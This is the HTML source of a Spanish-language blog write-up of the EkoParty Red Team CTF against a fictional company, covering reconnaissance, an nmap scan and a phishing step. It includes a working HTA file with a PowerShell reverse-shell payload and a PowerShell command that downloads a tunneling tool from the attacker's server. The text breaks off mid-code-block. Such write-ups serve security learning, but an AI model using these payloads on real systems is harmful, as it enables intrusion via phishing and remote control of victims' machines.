@@ -1,0 +1,590 @@
+<!DOCTYPE html>
+<html lang="es">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>WriteUp Redteam CTF EKOPARTY - BHF</title><meta name="Description" content="Hacking, sysadmin, beer."><meta property="og:title" content="WriteUp Redteam CTF EKOPARTY" />
+<meta property="og:description" content="WOW!! La EKO ya terminó y pasó todo muy rápido! Aún queda el cansancio y cuesta conciliar el sueño pensando en todo el contenido que hubo, en las otras posibles soluciones a las que encontramos y las de los retos que no pudimos solucionar. Fueron 3 días intensos de charlas, CTF&rsquo;s, café y cerveza!
+&ldquo;Drink all the booze hack all the things!&rdquo;   Desde que nos enteramos que habría un CTF en el espacio RedTeam nos propusimos intentarlo, el mismo se definía según sus autores de la siguiente manera: CTF RedTeam SpaceEl principal objetivo del Red Team es validar las capacidades de una organización contra ciberamenazas." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://bhf.com.ar/redteam-ctf-writeup/" />
+<meta property="og:image" content="https://cdn.iconscout.com/icon/premium/png-256-thumb/hacker-81-1105283.png"/>
+<meta property="article:published_time" content="2020-09-28T09:10:03-03:00" />
+<meta property="article:modified_time" content="2020-09-28T09:10:03-03:00" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://cdn.iconscout.com/icon/premium/png-256-thumb/hacker-81-1105283.png"/>
+
+<meta name="twitter:title" content="WriteUp Redteam CTF EKOPARTY"/>
+<meta name="twitter:description" content="WOW!! La EKO ya terminó y pasó todo muy rápido! Aún queda el cansancio y cuesta conciliar el sueño pensando en todo el contenido que hubo, en las otras posibles soluciones a las que encontramos y las de los retos que no pudimos solucionar. Fueron 3 días intensos de charlas, CTF&rsquo;s, café y cerveza!
+&ldquo;Drink all the booze hack all the things!&rdquo;   Desde que nos enteramos que habría un CTF en el espacio RedTeam nos propusimos intentarlo, el mismo se definía según sus autores de la siguiente manera: CTF RedTeam SpaceEl principal objetivo del Red Team es validar las capacidades de una organización contra ciberamenazas."/>
+<meta name="application-name" content="BHF">
+<meta name="apple-mobile-web-app-title" content="BHF"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://bhf.com.ar/redteam-ctf-writeup/" /><link rel="prev" href="https://bhf.com.ar/cloud-crackin-hashcat/" /><link rel="next" href="https://bhf.com.ar/stego-onapsis-writeup/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.7.2/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "WriteUp Redteam CTF EKOPARTY",
+        "inLanguage": "es",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/bhf.com.ar\/redteam-ctf-writeup\/"
+        },"image": {
+                "@type": "ImageObject",
+                "url": "https:\/\/bhf.com.ar\/cover.png",
+                "width":  800 ,
+                "height":  600 
+            },"genre": "posts","keywords": "writeup, redteam, ekoparty","wordcount":  2662 ,
+        "url": "https:\/\/bhf.com.ar\/redteam-ctf-writeup\/","datePublished": "2020-09-28T09:10:03-03:00","dateModified": "2020-09-28T09:10:03-03:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+                "@type": "Organization",
+                "name": "xxxx",
+                "logo": {
+                "@type": "ImageObject",
+                "url": "https:\/\/bhf.com.ar\/logo.png",
+                "width":  127 ,
+                "height":  40 
+                }
+            },"author": {
+                "@type": "Person",
+                "name": "Matias Ramirez. memoryempty, bronxi"
+            },"description": ""
+    }
+    </script></head>
+    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="BHF"><span class="header-title-pre"><i class='fas fa-laptop fa-fw'></i></span><span id="id-1" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categorias </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Busca títulos o contenido..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Buscar">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Limpiar">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Cambia el tema">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="BHF"><span class="header-title-pre"><i class='fas fa-laptop fa-fw'></i></span><span id="id-2" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Busca títulos o contenido..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Buscar">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Limpiar">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancelar
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categorias</a><a class="menu-item" href="/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Cambia el tema">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contenido</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">WriteUp Redteam CTF EKOPARTY</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Matias Ramirez. memoryempty, bronxi</a></span>&nbsp;<span class="post-category">incluido en <a href="/categories/writeup/"><i class="far fa-folder fa-fw"></i>writeup</a>&nbsp;<a href="/categories/redteam/"><i class="far fa-folder fa-fw"></i>redteam</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="09-28-2020">09-28-2020</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;2662 palabras&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;13 minutos&nbsp;</div>
+        </div><div class="featured-image"><img
+        class="lazyload"
+        src="/svg/loading/normal.min.svg"
+        data-src="/images/redteam-ctf-writeup/redteam.png"
+        data-srcset="/images/redteam-ctf-writeup/redteam.png, /images/redteam-ctf-writeup/redteam.png 1.5x, /images/redteam-ctf-writeup/redteam.png 2x"
+        data-sizes="auto"
+        alt="/images/redteam-ctf-writeup/redteam.png"
+        title="/images/redteam-ctf-writeup/redteam.png" /></div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>Contenido</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#ya-cómete-la-maldita-naranja">Ya cómete la maldita naranja!</a></li>
+    <li><a href="#2do-challenge">2do challenge.</a></li>
+    <li><a href="#3er-challenge">3er Challenge</a></li>
+    <li><a href="#4to-challenge">4to Challenge</a></li>
+    <li><a href="#5to-challenge">5to Challenge</a></li>
+    <li><a href="#final">Final</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>WOW!! La EKO ya terminó y pasó todo muy rápido! Aún queda el cansancio y cuesta conciliar el sueño pensando en todo el contenido que hubo, en las  otras posibles soluciones a las que encontramos y las de los retos que no pudimos solucionar. Fueron 3 días intensos de charlas, CTF&rsquo;s, café y cerveza!</p>
+<p>&ldquo;Drink all the booze hack all the things!&rdquo;
+
+<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
+  <iframe src="https://www.youtube-nocookie.com/embed/FoUWHfh733Y" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
+</div>
+</p>
+<p>Desde que nos enteramos que habría un CTF en el espacio RedTeam nos propusimos intentarlo, el mismo se definía según sus autores de la siguiente manera:
+<div class="details admonition info open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-info-circle fa-fw"></i>CTF RedTeam Space<i class="details-icon fas fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><p>El principal objetivo del Red Team es validar las capacidades de una organización contra ciberamenazas. Tratando de emular ataques y escenarios reales para que las empresas pueden enfocar sus esfuerzos en ejemplos realistas. El objetivo del CTF de la Zona de Red Team es crear desafíos para que los profesionales, o entusiastas en el área, puedan aprender nuevas técnicas y vectores de ataque.</p>
+<p>El desafío va a estar diseñado de la siguiente manera:</p>
+<pre><code>*La organización a atacar es Mandinga Corporation.
+*En esta edición los objetivos a atacar pueden ser personas o activos digitales.
+*Los participantes tienen que atacar a este objetivo y tiene que ir obteniendo. El formato de las flag es PUCARA{FLAG}
+*El último objetivo del challenge es tomar el control del Active Directory.
+*La idea es hacer el CTF lo más holístico posible utilizando desde técnicas de OSINT hasta post-explotacion.
+</code></pre>
+</div>
+        </div>
+    </div></p>
+<p>Los CTF&rsquo;s suelen ser en su mayoría retos de ingenio en los cuales usás técnicas o ves cuestiones que no se ven en el dia a dia del trabajo del Pentester/Hacker y en algunos casos cosas que solo vas a ver en un CTF. Debemos confesar que no nos sentimos muy cómodos con los típicos retos que uno suele encontrarse en un CTF. <a href="https://pucarasec.com/" target="_blank" rel="noopener noreffer">PucaraSec</a> supo cómo llevar a cabo un CTF equilibrado entre lo técnico y el aspecto de &ldquo;rompecabezas&rdquo;, que suelen tener los retos en estos tipos de eventos.</p>
+<h2 id="ya-cómete-la-maldita-naranja">Ya cómete la maldita naranja!</h2>
+<p><figure><a class="lightgallery" href="https://media1.tenor.com/images/02ff8bf14179b66b82fc9ea3757cdce0/tenor.gif" title="Los Simpsons" data-thumbnail="https://media1.tenor.com/images/02ff8bf14179b66b82fc9ea3757cdce0/tenor.gif" data-sub-html="<h2>Comencemos!</h2><p>Los Simpsons</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading/normal.min.svg"
+            data-src="https://media1.tenor.com/images/02ff8bf14179b66b82fc9ea3757cdce0/tenor.gif"
+            data-srcset="https://media1.tenor.com/images/02ff8bf14179b66b82fc9ea3757cdce0/tenor.gif, https://media1.tenor.com/images/02ff8bf14179b66b82fc9ea3757cdce0/tenor.gif 1.5x, https://media1.tenor.com/images/02ff8bf14179b66b82fc9ea3757cdce0/tenor.gif 2x"
+            data-sizes="auto"
+            alt="Los Simpsons" />
+    </a><figcaption class="image-caption">Comencemos!</figcaption>
+    </figure></p>
+<p>El primer reto nos invitaba a hacer reconocimiento y que encontremos el dominio de la empresa ficticia &ldquo;Mandinga Corporation&rdquo; como bien se nos explicaba en los objetivos las técnicas a utilizar van desde el OSINT hasta la post-explotacion. Arrancamos con un poco de &ldquo;Google Hacking&rdquo; para poder realizar el primer pedido, con la siguiente búsqueda &ldquo;Mandinga Corporation site:red.ctf.ekoparty.org&rdquo;. Podíamos acceder a la version cacheada de la pagina del CTF en google y ver que anteriormente en el contenido del sitio estaba el dominio a atacar. En este caso, el dominio era &ldquo;mandingacorp.xyz&rdquo;, se trataba de un sitio en Wordpress con información institucional sobre &ldquo;Mandinga Corp&rdquo;, lamentablemente me olvidé de sacarle una captura de pantalla. Si bien ya teníamos el dominio, el flag para validar el reto era otro que se encontraba en una de las secciones de la página, en el código HTML.</p>
+<p><figure><a class="lightgallery" href="/images/redteam-ctf-writeup/flagmandinga.png" title="1er Flag" data-thumbnail="/images/redteam-ctf-writeup/flagmandinga.png" data-sub-html="<h2>1er FLAG</h2><p>1er Flag</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading/normal.min.svg"
+            data-src="/images/redteam-ctf-writeup/flagmandinga.png"
+            data-srcset="/images/redteam-ctf-writeup/flagmandinga.png, /images/redteam-ctf-writeup/flagmandinga.png 1.5x, /images/redteam-ctf-writeup/flagmandinga.png 2x"
+            data-sizes="auto"
+            alt="1er Flag" />
+    </a><figcaption class="image-caption">1er FLAG</figcaption>
+    </figure></p>
+<p>La verdad que el primer flag no fue tan fácil, en la emoción de querer hacer las cosas rápido y pasar al siguiente nivel, a veces te perdés los detalles de mirar el código HTML. Además, en un principio muchos de los que también estaban intentando realizar el CTF empezaron a darle con las herramientas automatizadas y el sitio quedó inaccesible, por suerte el equipo de PucaraSec hizo un terrible trabajo contestando cada una de las inquietudes y problemas a toda hora en el canal de Discord.</p>
+<h2 id="2do-challenge">2do challenge.</h2>
+<p>Para el segundo flag teníamos la siguiente consigna.</p>
+<p><figure><a class="lightgallery" href="/images/redteam-ctf-writeup/challenge2.png" title="2do challenge" data-thumbnail="/images/redteam-ctf-writeup/challenge2.png" data-sub-html="<h2>2do challenge</h2><p>2do challenge</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading/normal.min.svg"
+            data-src="/images/redteam-ctf-writeup/challenge2.png"
+            data-srcset="/images/redteam-ctf-writeup/challenge2.png, /images/redteam-ctf-writeup/challenge2.png 1.5x, /images/redteam-ctf-writeup/challenge2.png 2x"
+            data-sizes="auto"
+            alt="2do challenge" />
+    </a><figcaption class="image-caption">2do challenge</figcaption>
+    </figure></p>
+<p>Como siempre en este tipo de eventos las pistas están en los enunciados de una manera rebuscada, lo que primero podemos ver a simple vista es que nos dice la respuesta está en los usuarios de Mandinga Corp. Navegando por la página pudimos encontrar lo siguiente:</p>
+<p><figure><a class="lightgallery" href="/images/redteam-ctf-writeup/emails.png" title="redteam.png" data-thumbnail="/images/redteam-ctf-writeup/emails.png" data-sub-html="<h2>Usuarios!</h2><p>redteam.png</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading/normal.min.svg"
+            data-src="/images/redteam-ctf-writeup/emails.png"
+            data-srcset="/images/redteam-ctf-writeup/emails.png, /images/redteam-ctf-writeup/emails.png 1.5x, /images/redteam-ctf-writeup/emails.png 2x"
+            data-sizes="auto"
+            alt="redteam.png" />
+    </a><figcaption class="image-caption">Usuarios!</figcaption>
+    </figure>
+<figure><a class="lightgallery" href="/images/redteam-ctf-writeup/usuarios.png" title="redteam.png" data-thumbnail="/images/redteam-ctf-writeup/usuarios.png" data-sub-html="<h2>Mas usuarios!</h2><p>redteam.png</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading/normal.min.svg"
+            data-src="/images/redteam-ctf-writeup/usuarios.png"
+            data-srcset="/images/redteam-ctf-writeup/usuarios.png, /images/redteam-ctf-writeup/usuarios.png 1.5x, /images/redteam-ctf-writeup/usuarios.png 2x"
+            data-sizes="auto"
+            alt="redteam.png" />
+    </a><figcaption class="image-caption">Mas usuarios!</figcaption>
+    </figure></p>
+<p>Realizando más enumeración sobre el dominio con <a href="dnsdumpster.com" rel="">dnsdumpster</a> pudimos obtener la siguiente información:</p>
+<p><figure><a class="lightgallery" href="/images/redteam-ctf-writeup/dnsdumpster.png" title="dnsdumpster" data-thumbnail="/images/redteam-ctf-writeup/dnsdumpster.png" data-sub-html="<h2>dnsdumpster</h2><p>dnsdumpster</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading/normal.min.svg"
+            data-src="/images/redteam-ctf-writeup/dnsdumpster.png"
+            data-srcset="/images/redteam-ctf-writeup/dnsdumpster.png, /images/redteam-ctf-writeup/dnsdumpster.png 1.5x, /images/redteam-ctf-writeup/dnsdumpster.png 2x"
+            data-sizes="auto"
+            alt="dnsdumpster" />
+    </a><figcaption class="image-caption">dnsdumpster</figcaption>
+    </figure></p>
+<p>Enumeramos con nmap mail.mandingacorp.xyz</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-22 14:50 -03
+Nmap scan report for mail.mandingacorp.xyz (54.94.146.7)
+Host is up (0.066s latency).
+Not shown: 9995 filtered ports
+PORT     STATE SERVICE       VERSION
+25/tcp   open  smtp?
+| smtp-commands: localhost, SIZE 20480000, AUTH LOGIN, HELP,
+|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+110/tcp  open  pop3          hMailServer pop3d
+|_pop3-capabilities: UIDL USER TOP
+143/tcp  open  imap          hMailServer imapd
+|_imap-capabilities: IDLE completed RIGHTS=texkA0001 CAPABILITY OK IMAP4rev1 SORT IMAP4 QUOTA CHILDREN NAMESPACE ACL
+587/tcp  open  submission?
+| fingerprint-strings:
+
+| smtp-commands: localhost, SIZE 20480000, AUTH LOGIN, HELP,
+|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+</code></pre></td></tr></table>
+</div>
+</div><p>Vemos que nos encontramos con un servidor de correo y previamente pudimos obtener nombres de usuarios. Si bien solo tenemos a &ldquo;<a href="mailto:wanda.nardo@mandingacorp.xyz">wanda.nardo@mandingacorp.xyz</a>&rdquo; y &ldquo;<a href="mailto:susana.gimenes@mandingacorp.xyz">susana.gimenes@mandingacorp.xyz</a>&rdquo; es fácil inferir que las personas en &ldquo;Our Team&rdquo; deben tener el correo con forma &ldquo;<a href="mailto:nombre.apellido@mandingacorp.xyz">nombre.apellido@mandingacorp.xyz</a>&rdquo; . Nos queda la siguiente lista de supuestos correos validos.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">marcelo.tineli@mandingacorp.xyz
+florencia.penia@mandingacorp.xyz
+hugo.mochano@mandingacorp.xyz
+wanda.nardo@mandingacorp.xyz
+susana.gimenes@mandingacorp.xyz
+</code></pre></td></tr></table>
+</div>
+</div><p>Al enviar un correo todos los usuarios respondían y podíamos encontrarnos con mensajes graciosos como el siguiente:</p>
+<p><figure><a class="lightgallery" href="/images/redteam-ctf-writeup/respuestacorreo.png" title="Respuesta" data-thumbnail="/images/redteam-ctf-writeup/respuestacorreo.png" data-sub-html="<h2>Respuesta</h2><p>Respuesta</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading/normal.min.svg"
+            data-src="/images/redteam-ctf-writeup/respuestacorreo.png"
+            data-srcset="/images/redteam-ctf-writeup/respuestacorreo.png, /images/redteam-ctf-writeup/respuestacorreo.png 1.5x, /images/redteam-ctf-writeup/respuestacorreo.png 2x"
+            data-sizes="auto"
+            alt="Respuesta" />
+    </a><figcaption class="image-caption">Respuesta</figcaption>
+    </figure></p>
+<p>Gracias a una experiencia previa en una máquina de HackTheBox, intenté enviar un correo con un enlace para ver si algunos de los usuarios accedía, el enlace iba directo a mi servidor web. Envié el enlace a todos los usuarios&hellip; me quedé mirando los logs del servidor, pero solo veía las peticiones de los bots de Shodan, Google y alguna que otra IP China intentando vulnerar mi servidor WEB. A todo esto ya estaba entrada la noche del primer díaa de la Ekoparty, varias horas de charlas, el CTF de RedTeam y el de ONAPSIS en paralelo; ¡no había estirado las piernas en 8 horas!
+Junto con bronxi, salimos a comprar unas cervezas y recibir un poco de oxígeno, a las 2 cuadras de nuestro trayecto al parecer mi cerebro se oxígeno y relacionó las palabras &ldquo;Higo, Tartas, Almendras&rdquo; con las siglas HT. Recordé que si el usuario abre un archivo .HTA mediante Internet Explorer podíamos conseguir ejecución de código. Volvimos ya con las piernas estiradas y el cerebro oxigenado a la carga, preparé el siguiente archivo HTA:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="kd">var</span> <span class="nx">c</span><span class="o">=</span> <span class="s2">&#34;powershell -nop -w 1 -c \&#34;$client = New-Object System.Net.Sockets.TCPClient(&#39;127.0.0.1&#39;,8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\&#34;&#34;</span>
+<span class="k">new</span> <span class="nx">ActiveXObject</span><span class="p">(</span><span class="s1">&#39;WScript.Shell&#39;</span><span class="p">).</span><span class="nx">Run</span><span class="p">(</span><span class="nx">c</span><span class="p">);</span>
+<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">self</span><span class="p">.</span><span class="nx">close</span><span class="p">();</span>
+<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+
+</code></pre></td></tr></table>
+</div>
+</div><p>El payload nos da una shell inversa con powershell al host y puertos seleccionados, a la persona que esté leyendo le recomiendo el repositorio <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md" target="_blank" rel="noopener noreffer">PayloadAllTheThings</a> que contiene disintas maneras de generar shells inversas en distintos lenguajes de programación y sistemas operativos.</p>
+<p>Junto con memoryempty intentamos mandar el correo de todas las maneras que se nos ocurrió. No hubo caso, no teníamos una shell ni un vestigio de que algo o alguien fuera a buscar nuestro payload. Ya eran las 23hs. del primer día de la eko y nadie había logrado sacar el segundo flag. Comimos, tomamos más cerveza, intentamos más cosas y nada. Hubo que irse a dormir pensando que estabamos equivocados.
+Al otro día, a las 8 AM, ya estabamos &ldquo;descansados&rdquo; e intentando nuevamente obtener el flag. Los chicos de PucaraSec habían dejado más pistas durante la madrugada. Como buena noticia, estabamos en lo correcto habíaa que mandarle un correo a un usuario con un enlace a un archivo HTA. Asi que manos a la obra nuevamente, para ser más explícitos cambiaron el mensaje de uno de los usuarios y contestaba de la siguiente manera:</p>
+<p><figure><a class="lightgallery" href="/images/redteam-ctf-writeup/correomarcelo.png" title="Respuesta Marcelo" data-thumbnail="/images/redteam-ctf-writeup/correomarcelo.png" data-sub-html="<h2>Qué raro el CEO de la empresa siendo víctima de phishing(?</h2><p>Respuesta Marcelo</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading/normal.min.svg"
+            data-src="/images/redteam-ctf-writeup/correomarcelo.png"
+            data-srcset="/images/redteam-ctf-writeup/correomarcelo.png, /images/redteam-ctf-writeup/correomarcelo.png 1.5x, /images/redteam-ctf-writeup/correomarcelo.png 2x"
+            data-sizes="auto"
+            alt="Respuesta Marcelo" />
+    </a><figcaption class="image-caption">Qué raro el CEO de la empresa siendo víctima de phishing(?</figcaption>
+    </figure></p>
+<p>Marcelo era nuestra víctima,los otros usuarios quedaban descartados. Nuevamente volvimos a intentar hasta que llegaron las pistas de los chicos de Pucara. El envió de los enlaces era tan fácil como &ldquo;ip/payload.hta&rdquo;, no había que rebuscársela mucho, nosotros habiamos intentado hasta con dominio y SSL activado, ¡estabamos desesperados!</p>
+<p><figure><a class="lightgallery" href="/images/redteam-ctf-writeup/firstblood.png" title="Foothold" data-thumbnail="/images/redteam-ctf-writeup/firstblood.png" data-sub-html="<h2>Tenemos una shell!!</h2><p>Foothold</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading/normal.min.svg"
+            data-src="/images/redteam-ctf-writeup/firstblood.png"
+            data-srcset="/images/redteam-ctf-writeup/firstblood.png, /images/redteam-ctf-writeup/firstblood.png 1.5x, /images/redteam-ctf-writeup/firstblood.png 2x"
+            data-sizes="auto"
+            alt="Foothold" />
+    </a><figcaption class="image-caption">Tenemos una shell!!</figcaption>
+    </figure>
+No se si también les pasa, pero siento que no hay momento más emocionante que recibir una conexión! Todas las ganas de romper el teclado se desvanecen y solo querés ver qué es lo que sigue! El flag se encontraba en la carpeta &ldquo;Documents&rdquo; en el usuario &ldquo;marce&rdquo;.</p>
+<h2 id="3er-challenge">3er Challenge</h2>
+<p><figure><a class="lightgallery" href="/images/redteam-ctf-writeup/challenge3.png" title="3er challenge" data-thumbnail="/images/redteam-ctf-writeup/challenge3.png" data-sub-html="<h2>3er challenge</h2><p>3er challenge</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading/normal.min.svg"
+            data-src="/images/redteam-ctf-writeup/challenge3.png"
+            data-srcset="/images/redteam-ctf-writeup/challenge3.png, /images/redteam-ctf-writeup/challenge3.png 1.5x, /images/redteam-ctf-writeup/challenge3.png 2x"
+            data-sizes="auto"
+            alt="3er challenge" />
+    </a><figcaption class="image-caption">3er challenge</figcaption>
+    </figure></p>
+<p>Marcelo nos dio el &ldquo;foothold&rdquo;, ahora comienza lo divertido: el movimiento lateral y el reconocmiento de la red interna. En la página institucional había una seccion llamada &ldquo;Bank&rdquo; que te dirigía al enlace &ldquo;https://10.0.228&rdquo;, conociendo esto necesitamos alguna manera de poder ver y enumerar los distintos recursos de la red interna. Necesitamos hacer un &ldquo;Túnel&rdquo; entre nuestra máquina atacante hacia la que obtuvimos acceso. Esto se conoce como tunneling y hay varias maneras de realizarlo, si hubiéramos usado metasploit lo traería inegrado, aunque leí en Discord que a muchos nos les estuvo funcionando para este CTF. Como nosotros teníamos una shell en powershell, decidimos usar una herramienta llamada <a href="https://github.com/jpillora/chisel" target="_blank" rel="noopener noreffer">chisel</a>, es un solo binario escrito en GO y tiene muchas características! Descargamos la versión de Windows de chisel en nuestro servidor web, lo descomprimos y lo descargamos en nuestra máquina objetivo usando powershell &ldquo;iwr -Uri http:/ip/chisel.exe -OutFile chisel.exe&rdquo;. Una vez descargado, necesitamos correrlo en nuestra máquina atacante en modo servidor con los siguientes parametros:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
